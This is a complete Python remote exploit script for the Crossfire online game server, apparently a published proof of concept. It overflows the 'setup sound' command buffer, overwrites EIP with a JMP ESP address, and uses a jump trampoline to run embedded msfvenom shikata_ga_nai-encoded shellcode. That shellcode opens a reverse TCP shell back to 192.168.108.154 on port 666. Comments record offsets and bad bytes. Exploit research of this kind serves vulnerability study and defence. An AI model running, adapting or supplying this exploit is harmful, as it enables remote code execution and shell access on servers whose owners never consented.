#!/usr/bin/python
# Crossfire Online Game Remote Exploit
# Written by Douglas Berdeaux 2019, WeakNet Labs, Demon Linux
import socket as so
import sys
# user args
target=sys.argv[1]
port=int(sys.argv[2])

badByteList="\x20\x00\x0a\x0d" # I am not sure about the last two

# msfvenom --platform=linux --arch=x86 --payload=linux/x86/shell_reverse_tcp LHOST=192.168.108.154 LPORT=666 -e x86/shikata_ga_nai -f python -b="\x00\x0a\x0d\x20"
# Found 1 compatible encoders
# Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
# x86/shikata_ga_nai succeeded with size 95 (iteration=0)
# x86/shikata_ga_nai chosen with final size 95
# Payload size: 95 bytes
# Final size of python file: 470 bytes
buf =  ""
buf += "\xbd\x7c\xa5\x5e\xcf\xd9\xc3\xd9\x74\x24\xf4\x5a\x33"
buf += "\xc9\xb1\x12\x31\x6a\x12\x03\x6a\x12\x83\xbe\xa1\xbc"
buf += "\x3a\x0f\x71\xb7\x26\x3c\xc6\x6b\xc3\xc0\x41\x6a\xa3"
buf += "\xa2\x9c\xed\x57\x73\xaf\xd1\x9a\x03\x86\x54\xdc\x6b"
buf += "\xd9\x0f\x72\xf1\xb1\x4d\x8b\x07\xd8\xdb\x6a\xb7\xba"
buf += "\x8b\x3d\xe4\xf1\x2f\x37\xeb\x3b\xaf\x15\x83\xad\x9f"
buf += "\xea\x3b\x5a\xcf\x23\xd9\xf3\x86\xdf\x4f\x57\x10\xfe"
buf += "\xdf\x5c\xef\x81"


# ECX starts good, but is only 160-some bytes, 
#  not enough for shell code
# EAX and EDX are exactly the same.
#  they start at 12 useless bytes, "setup sound "
# ESP has only 7 free bytes,"CCCCCCC"
#  enough to add 12 bytes to EAX/EDX and also JMP EAX/EDX

# JMP ESP (After crash) Exists:
# 0x08134596

# does not contain bad bytes:
# 00000000  83C00C            add eax,byte +0xc
# 00000000  FFE0              jmp eax

# total size of buffer: 4396
# total size of payload: 4379
# EIP at offset 4368
#buffer = "\x11(setup sound "+  "A"*4368  +"ABCD"+"C"*(4379-4368-4)  +"\x90\x00#"
#buffer = "\x11(setup sound "+  badBytes+"A"*(4368-253)  +"ABCD"+"C"*(4379-4368-4)  +"\x90\x00#"
buffer = "\x11(setup sound "+  buf + "\x90"*(4368-len(buf))  +"\x96\x45\x13\x08"+"\x83\xC0\x0C\xFF\xE0\x90\x90" +"\x90\x00#"
s=so.socket(so.AF_INET,so.SOCK_STREAM)
print "[*] Buffer length: "+str(len(buffer))
print "[*] Sending buffer to: "+target
s.connect((target,port))
s.send(buffer)
s.recv(1024)
s.close
print "[*] Exploit finished."
